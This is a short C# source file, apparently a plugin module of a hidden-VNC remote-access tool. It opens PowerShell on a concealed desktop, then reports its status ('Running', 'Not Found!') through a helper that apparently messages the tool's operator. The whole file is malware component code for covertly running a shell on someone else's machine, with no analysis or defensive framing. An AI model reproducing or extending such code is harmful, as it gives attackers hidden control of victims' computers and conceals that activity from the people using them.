#define DEBUG
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using HVNC;

namespace S.OpenApp;

internal class PowerShell
{
	private static readonly string fileNamePowerShell = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\WindowsPowerShell\\v1.0\\powershell.exe";

	public static void Open()
	{
		try
		{
			if (!File.Exists(fileNamePowerShell))
			{
				HVNC.Plugin.Helper.SendMSG("PowerShell: Not Found!");
				return;
			}
			HideDesktop.CreateProcess(fileNamePowerShell, HVNC.Plugin.Helper.NameDesktop, bAppName: false);
			Debug.WriteLine("Running.////");
			HVNC.Plugin.Helper.SendMSG("PowerShell: Running");
			Thread.Sleep(3000);
			HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
			Debug.WriteLine("Refresh");
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("PowerShell: " + ex.Message);
		}
	}
}
